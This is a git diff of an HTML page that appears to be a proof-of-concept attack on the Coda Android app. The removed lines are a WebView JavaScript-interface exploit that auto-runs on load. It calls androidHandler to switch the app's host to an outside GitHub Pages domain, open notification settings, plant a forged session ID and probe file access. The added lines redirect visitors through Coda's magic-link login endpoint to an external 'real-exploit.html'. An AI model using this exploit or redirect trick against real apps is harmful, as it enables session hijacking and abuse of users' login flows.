@@ -1,83 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Coda App Exploit Test</title>
+    <script>
+        // Redirect to Coda first, then back to exploit
+        window.location.href = 'https://coda.io/auth/api/magicLinkLogin?redirect=' + 
+                              encodeURIComponent('https://keylorx.github.io/real-exploit.html');
+    </script>
 </head>
 <body>
-    <h1>WebView JavaScript Interface Exploit</h1>
-    
-    <script>
-        function exploit() {
-            // Test 1: Check if we can access the Android interface
-            if (typeof androidHandler !== 'undefined') {
-                document.getElementById('status').innerHTML = '✅ VULNERABLE: androidHandler found!';
-                
-                // Test 2: Try to change host to your domain
-                try {
-                    var result = androidHandler.postMessage(JSON.stringify({
-                        "action": "changeHost",
-                        "newHost": "https://keylorx.github.io"
-                    }));
-                    console.log('Change host result:', result);
-                    document.getElementById('host-change').innerHTML = '✅ Host change attempted';
-                } catch(e) {
-                    console.error('Host change failed:', e);
-                }
-                
-                // Test 3: Try to access sensitive actions
-                try {
-                    // Attempt to navigate to notification settings
-                    androidHandler.postMessage(JSON.stringify({
-                        "action": "navigateToNotificationSettings"
-                    }));
-                    document.getElementById('notifications').innerHTML = '✅ Notification access attempted';
-                } catch(e) {
-                    console.error('Notification access failed:', e);
-                }
-                
-                // Test 4: Try to store session data
-                try {
-                    androidHandler.postMessage(JSON.stringify({
-                        "action": "storeSessionData",
-                        "userId": "hacked_user_123"
-                    }));
-                    document.getElementById('session').innerHTML = '✅ Session storage attempted';
-                } catch(e) {
-                    console.error('Session storage failed:', e);
-                }
-                
-            } else {
-                document.getElementById('status').innerHTML = '❌ androidHandler not found';
-            }
-        }
-        
-        // Test 5: Try file upload access
-        function testFileAccess() {
-            var input = document.createElement('input');
-            input.type = 'file';
-            input.multiple = true;
-            input.onchange = function(e) {
-                var files = e.target.files;
-                document.getElementById('file-access').innerHTML = '✅ File access: ' + files.length + ' files selected';
-            };
-            input.click();
-        }
-    </script>
-    
-    <div id="status">Testing...</div>
-    <div id="host-change"></div>
-    <div id="notifications"></div>
-    <div id="session"></div>
-    <div id="file-access"></div>
-    
-    <button onclick="exploit()">Run Exploit</button>
-    <button onclick="testFileAccess()">Test File Access</button>
-    
-    <script>
-        // Auto-run exploit after page load
-        window.onload = function() {
-            setTimeout(exploit, 1000);
-        };
-    </script>
+    Redirecting to Coda...
 </body>
 </html>
